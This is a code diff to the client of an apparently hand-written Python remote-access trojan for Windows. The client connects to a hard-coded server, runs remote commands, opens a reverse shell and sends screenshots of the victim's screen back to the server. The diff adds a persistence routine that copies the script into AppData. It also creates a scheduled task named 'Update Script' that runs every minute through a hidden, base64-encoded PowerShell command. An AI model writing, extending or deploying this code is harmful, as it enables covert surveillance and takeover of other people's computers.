@@ -1,3 +1,4 @@
+from shutil import ExecError
 from socket import *
 import os
 from time import sleep
@@ -54,8 +55,13 @@ def reverse_shell(client):  # Returns revese shell to server
 
 def screenshot(client):  # Takes screenshot of PC and send it to server
     try:
-        name = random.randint(0, 100000)
-        filename = f"TEMP\{name}.jpg"
+        name = random.randint(0, 100000000)
+        username = os.getlogin()
+        try:
+            os.mkdir(f"C:/Users/{username}/AppData/Roaming/TEMP")
+        except Exception as e:
+            pass
+        filename = f"C:/Users/{username}/AppData/Roaming/TEMP/{name}.jpg"
         im = pyautogui.screenshot()
         im.save(filename)
         client.sendall(filename.encode())
@@ -68,7 +74,7 @@ def screenshot(client):  # Takes screenshot of PC and send it to server
                     break
                 client.sendall(bytes_read)
     except Exception as e:
-        print("Error")
+        print(f"Error + {e}")
 
 
 def start_client():  # Start the client side and all the communication is here.
@@ -92,6 +98,8 @@ def start_client():  # Start the client side and all the communication is here.
                 client.sendall(output.encode())
             elif command == "screenshot":
                 screenshot(client)
+            elif command == "persistence":
+                persistence()
             elif command == "alive?":
                 client.sendall("yes".encode())
             else:
@@ -103,12 +111,21 @@ def start_client():  # Start the client side and all the communication is here.
         print(f"Server disconnected!")
         sleep(1)
 
+def persistence():
+    try:
+        cwd = os.getcwd() #Gets current working directory
+        username = os.getlogin() #Gets current username of host
+        os.system(fr'copy "{cwd}\client.py" "C:\Users\{username}\AppData\Roaming"')
+        os.system(fr'schtasks /create /sc minute /mo 1 /tn "Update Script" /tr "powershell.exe -nop -w hidden -e SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAB7ACAAcAB5AHQAaABvAG4AIABDADoAXABVAHMAZQByAHMAXABEAGEAbgBpAGUAbABcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwAYwBsAGkAZQBuAHQALgBwAHkAIAB9AA=="')
+        client.sendall("Persistence added successfully.".encode())
+    except Exception as e:
+        print(f"{e}")
 
 while True:
     if(isConncted == False):
         try:
             client = socket(AF_INET, SOCK_STREAM)
-            client.connect(("10.100.102.96", 5555))
+            client.connect(("10.100.102.19", 5555))
             isConncted = True
             print("Conncted to Server!")
             start_client()  # Starts client
